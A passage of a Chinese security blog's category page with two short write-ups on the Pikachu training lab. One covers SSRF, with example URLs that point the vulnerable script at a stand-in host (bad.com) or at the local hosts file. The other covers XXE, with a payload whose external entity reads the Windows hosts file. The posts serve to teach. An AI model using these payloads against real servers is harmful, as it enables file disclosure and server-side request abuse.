+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sql-injection/">sql injection, </a><a class="link-muted" rel="tag" href="/tags/sqli-labs/">sqli-labs </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-21T00:45:35.000Z" title="12/21/2021, 8:45:35 AM">2021-12-21</time>发表</span><span class="level-item"><time dateTime="2021-12-21T00:45:35.000Z" title="12/21/2021, 8:45:35 AM">2021-12-21</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">2 分钟读完 (大约236个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-Pikachu-SSRF/">something about Pikachu - SSRF</a></h1><div class="content"><h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/pikachu">备份地址</a></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)。主要由于服务端提供了从其他服务器应用获取数据
+的功能，但又未对目标地址做严格的限制，导致攻击者可以传入恶意地址。服务器对恶意地址进行请求，
+返回恶意内容后造成损失。</p>
+<p>PHP后台对目标地址请求的函数主要有:</p>
+<ul>
+<li><p>file_get_contents()</p>
+</li>
+<li><p>fsockopen()</p>
+</li>
+<li><p>curl_exec()</p>
+</li>
+</ul>
+<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>在url中拼接对应的恶意地址即可。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_curl.php?url=http://bad.com/</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p>在url中拼接对应的恶意地址即可。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=http://bad.com/bad.php</span><br></pre></td></tr></table></figure>
+
+<p>也可指定目标服务器上指定文件。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://train.com/pikachu/vul/ssrf/ssrf_fgc.php?file=C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/pikachu/">pikachu, </a><a class="link-muted" rel="tag" href="/tags/SSRF/">SSRF </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-12-17T15:09:55.000Z" title="12/17/2021, 11:09:55 PM">2021-12-17</time>发表</span><span class="level-item"><time dateTime="2021-12-17T15:09:55.000Z" title="12/17/2021, 11:09:55 PM">2021-12-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/penetration-Test/">penetration Test</a><span> / </span><a class="link-muted" href="/categories/penetration-Test/train/">train</a></span><span class="level-item">2 分钟读完 (大约324个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/something-about-Pikachu-XXE/">something about Pikachu - XXE</a></h1><div class="content"><h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p><a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">pikachu</a>    =&gt; <a target="_blank" rel="noopener" href="https://github.com/to-be-the-one/pikachu">备份地址</a></p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>XXE(XML external entity injection)，<code>xml外部实体注入</code>。<br>
+概括就是，攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行，
+导致问题。<br>
+目前很多语言中，对应的解析xml的函数默认是禁止解析外部实体内容的，从而直接避免此漏洞。</p>
+<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>XML用来存储数据或传输数据。<br></p>
+<p>一般定义如下:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第一部分:文档声明部分 --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第二部分:文档定义类型DTD --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档类型为note类型 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定义名为`myparam`的外部实体的值为`myValue` --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">myparam</span> <span class="string">&quot;myValue&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第三部分:文档元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;myparam;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>正常开发时，第一部分一般不会注意。第二部分一般使用url引入需要的<code>DTD</code>。在之前学比较老的<code>SpringMVC</code>，
+使用<code>XML</code>配置文件时，文件头就会引入<code>Spring</code>的文档定义类型，然后在<code>第三部分</code>中就可以使用对应的<code>实体(标记对)</code>。</p>
+<p>构造<code>payload</code>,访问敏感文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [<span class="meta">&lt;!ENTITY <span class="keyword">myparam</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;myparam;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/pikachu/">pikachu, </a><a class="link-muted" rel="tag" href="/tags/XXE/">XXE </a></div></div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/categories/penetration-Test/train/">上一页</a></div><div class="pagination-next"><a href="/categories/penetration-Test/train/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/categories/penetration-Test/train/">1</a></li><li><a class="pagination-link is-current" href="/categories/penetration-Test/train/page/2/">2</a></li><li><a class="pagination-link" href="/categories/penetration-Test/train/page/3/">3</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/categories/penetration-Test/train/page/7/">7</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">十二月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/11/"><span class="level-start"><span class="level-item">十一月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">九月 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">八月 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">二月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">19</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">I wanna be the guy.</a><p class="is-size-7"><span>&copy; 2023 cyhfvg</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/cyhfvg"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
